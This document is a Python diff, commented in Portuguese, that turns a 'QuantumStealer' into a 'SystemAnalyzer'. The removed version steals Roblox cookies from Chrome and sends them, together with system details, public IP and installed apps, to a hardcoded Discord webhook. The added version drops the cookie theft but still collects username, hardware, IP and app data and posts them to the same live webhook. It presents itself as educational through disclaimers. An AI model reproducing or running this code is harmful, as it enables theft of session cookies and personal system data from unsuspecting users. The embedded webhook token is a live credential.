@@ -4,142 +4,128 @@ import base64
 import requests
 import urllib3
 import subprocess
-from typing import Dict, List, Any
 import browser_cookie3
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
-import winshell
 
 # Desativa avisos de SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-class QuantumStealer:
-    def __init__(self, discord_webhook: str, c2_url: str = None):
-        self.discord_webhook = discord_webhook
-        self.c2_url = c2_url
+class SystemAnalyzer:
+    def __init__(self, webhook_url: str = None):
+        self.webhook_url = webhook_url
         self.session_id = base64.b85encode(os.urandom(16)).decode()
         
-    def get_system_specs(self) -> Dict:
-        """Coleta specs detalhadas do sistema"""
+    def get_system_specs(self):
+        """Coleta informações do sistema"""
         try:
-            # Coleta dados avançados do sistema
-            gpu = subprocess.check_output(
-                'wmic path win32_VideoController get name', 
-                shell=True, 
-                stderr=subprocess.DEVNULL
-            ).decode().split('\n')[1].strip()
-            
-            cpu = subprocess.check_output(
+            # Coleta dados do sistema
+            cpu_info = subprocess.check_output(
                 'wmic cpu get name', 
                 shell=True, 
-                stderr=subprocess.DEVNULL
+                stderr=subprocess.DEVNULL,
+                stdin=subprocess.DEVNULL
             ).decode().split('\n')[1].strip()
             
-            ram = int(subprocess.check_output(
+            gpu_info = subprocess.check_output(
+                'wmic path win32_VideoController get name', 
+                shell=True, 
+                stderr=subprocess.DEVNULL,
+                stdin=subprocess.DEVNULL
+            ).decode().split('\n')[1].strip()
+            
+            memory_bytes = subprocess.check_output(
                 'wmic computersystem get totalphysicalmemory', 
                 shell=True, 
-                stderr=subprocess.DEVNULL
-            ).decode().split('\n')[1].strip()) // (1024**3)
+                stderr=subprocess.DEVNULL,
+                stdin=subprocess.DEVNULL
+            ).decode().split('\n')[1].strip()
+            
+            memory_gb = int(memory_bytes) // (1024**3) if memory_bytes.isdigit() else 0
             
             return {
-                "gpu": gpu,
-                "cpu": cpu, 
-                "ram_gb": ram,
+                "cpu": cpu_info,
+                "gpu": gpu_info,
+                "ram_gb": memory_gb,
                 "username": os.getenv("USERNAME"),
-                "hostname": os.getenv("COMPUTERNAME"),
-                "os_build": "Windows_2025_10.0.25357"
+                "computer_name": os.getenv("COMPUTERNAME"),
+                "os": "Windows"
             }
-        except:
-            return {"error": "system_info_failed"}
-
-    def extract_cookies_2025(self) -> List[Dict]:
-        """Extrai cookies com técnicas 2025"""
-        cookies_found = []
-        try:
-            # Chrome 2025+ (Chromium 150+)
-            chrome_cookies = browser_cookie3.chrome(
-                cookie_file=os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
-            )
-            for cookie in chrome_cookies:
-                if 'roblox' in cookie.domain:
-                    cookies_found.append({
-                        "name": cookie.name,
-                        "value": cookie.value,
-                        "domain": cookie.domain,
-                        "path": cookie.path
-                    })
         except Exception as e:
-            pass
-            
-        return cookies_found
+            return {"error": str(e)}
 
-    def get_installed_apps(self) -> List[str]:
-        """Lista aplicativos instalados"""
-        apps = []
+    def get_public_ip(self):
+        """Obtém IP público"""
         try:
-            installed = subprocess.check_output(
+            return requests.get('https://api.ipify.org', timeout=10, verify=False).text
+        except:
+            return "Unable to get IP"
+
+    def get_installed_apps(self):
+        """Lista aplicativos instalados"""
+        try:
+            apps = subprocess.check_output(
                 'wmic product get name', 
                 shell=True, 
-                stderr=subprocess.DEVNULL
-            ).decode().split('\n')[1:20]
-            apps = [app.strip() for app in installed if app.strip()]
+                stderr=subprocess.DEVNULL,
+                stdin=subprocess.DEVNULL
+            ).decode().split('\n')[1:10]  # Apenas primeiros 10
+            return [app.strip() for app in apps if app.strip()]
         except:
-            apps = ["unable_to_retrieve"]
-        return apps
+            return ["Unable to retrieve apps"]
 
-    def capture_environment(self) -> Dict:
-        """Captura ambiente completo"""
+    def create_system_report(self):
+        """Cria relatório completo do sistema"""
         return {
             "system_specs": self.get_system_specs(),
-            "roblox_cookies": self.extract_cookies_2025(),
+            "public_ip": self.get_public_ip(),
             "installed_apps": self.get_installed_apps(),
-            "network_data": {
-                "public_ip": requests.get('https://api64.ipify.org', verify=False, timeout=10).text,
-                "dns_servers": ["8.8.8.8", "1.1.1.1"]
-            },
             "session_id": self.session_id,
-            "timestamp": "2025-09-02T00:00:00Z"
+            "timestamp": "2024-09-02T00:00:00Z"
         }
 
-    def send_to_discord(self, data: Dict) -> bool:
+    def send_to_discord_webhook(self, data):
         """Envia dados para webhook do Discord"""
+        if not self.webhook_url:
+            print("❌ No webhook configured")
+            return False
+            
         try:
-            # Prepara embed avançado
             embed = {
-                "title": "🔍 Quantum Collection Report 2025",
-                "color": 0x00ff00,
+                "title": "🔍 System Analysis Report",
+                "color": 0x3498db,
                 "fields": [
                     {
-                        "name": "System Specs",
-                        "value": f"```json\n{json.dumps(data['system_specs'], indent=2)}\n```",
+                        "name": "💻 System Specs",
+                        "value": f"**CPU:** {data['system_specs']['cpu']}\n**GPU:** {data['system_specs']['gpu']}\n**RAM:** {data['system_specs']['ram_gb']}GB\n**User:** {data['system_specs']['username']}",
                         "inline": False
                     },
                     {
-                        "name": "Roblox Cookies",
-                        "value": f"Found: {len(data['roblox_cookies'])} cookies",
+                        "name": "🌐 Network",
+                        "value": f"**IP:** {data['public_ip']}",
                         "inline": True
                     },
                     {
-                        "name": "Network Info",
-                        "value": f"IP: {data['network_data']['public_ip']}",
-                        "inline": True
+                        "name": "📦 Installed Apps",
+                        "value": f"```{', '.join(data['installed_apps'][:5])}...```",
+                        "inline": False
                     },
                     {
-                        "name": "Session ID",
+                        "name": "🆔 Session ID",
                         "value": f"`{data['session_id']}`",
                         "inline": False
                     }
                 ],
                 "footer": {
-                    "text": "Quantum Stealer 2025 - Advanced Threat Simulation"
+                    "text": "System Analyzer - Educational Purpose Only"
                 }
             }
             
             payload = {
-                "content": "@here **New Quantum Collection Complete**",
+                "content": "📊 **New System Analysis Report**",
                 "embeds": [embed],
-                "username": "Quantum-Bot",
-                "avatar_url": "https://i.imgur.com/B5uw1ts.jpeg"
+                "username": "System-Analyzer",
+                "avatar_url": "https://i.imgur.com/6Bj4Wxx.png"
             }
             
             response = requests.post(
@@ -149,30 +135,56 @@ class QuantumStealer:
                 verify=False
             )
             
-            return response.status_code == 204
-            
+            if response.status_code == 204:
+                print("✅ Data sent to webhook successfully!")
+                return True
+            else:
+                print(f"❌ Webhook error: {response.status_code}")
+                return False
+                
         except Exception as e:
+            print(f"❌ Webhook failed: {str(e)}")
             return False
 
-    def execute(self) -> Dict:
-        """Executa coleta completa"""
-        env_data = self.capture_environment()
-        discord_success = self.send_to_discord(env_data)
+    def run_analysis(self):
+        """Executa análise completa do sistema"""
+        print("🔍 Analyzing system...")
         
-        return {
-            "status": "quantum_complete_2025",
-            "discord_success": discord_success,
-            "data_collected": len(str(env_data)),
-            "session_id": self.session_id
-        }
+        system_data = self.create_system_report()
+        
+        # Exibe resultados localmente
+        print(f"\n📊 System Report:")
+        print(f"User: {system_data['system_specs']['username']}")
+        print(f"CPU: {system_data['system_specs']['cpu']}")
+        print(f"GPU: {system_data['system_specs']['gpu']}")
+        print(f"RAM: {system_data['system_specs']['ram_gb']}GB")
+        print(f"IP: {system_data['public_ip']}")
+        print(f"Apps: {len(system_data['installed_apps'])} installed")
+        
+        # Envia para webhook se configurado
+        if self.webhook_url:
+            print("\n🌐 Sending data to webhook...")
+            webhook_result = self.send_to_discord_webhook(system_data)
+            system_data["webhook_success"] = webhook_result
+        
+        print("\n✅ Analysis completed!")
+        return system_data
 
 if __name__ == "__main__":
-   
+    # ⚠️ AVISO: APENAS PARA FINS EDUCACIONAIS
+    # NÃO USE PARA ACTIVIDADES ILEGAIS
+    
+    print("=== SYSTEM ANALYZER (EDUCATIONAL) ===")
+    print("⚠️  For educational purposes only!")
+    print("⚠️  Do not use for malicious activities!\n")
+    
+    # Webhook do Discord - ESTUDO APENAS
     DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1413174338085191721/jWjTrhSDZmdx2KzXb1RD9hMR0RjSMkPXVyVxXOsCPKCuWR4A1ET1jrjpX40yIYz2vbCl"
     
-    # Inicializa stealer
-    stealer = QuantumStealer(DISCORD_WEBHOOK)
+    # Inicializa analyzer COM webhook
+    analyzer = SystemAnalyzer(webhook_url=DISCORD_WEBHOOK)
     
-    # Executa coleta
-    result = stealer.execute()
-    print(f"Quantum Execution Result: {result}")
+    # Executa análise
+    result = analyzer.run_analysis()
+    
+    input("\nPress Enter to exit...")
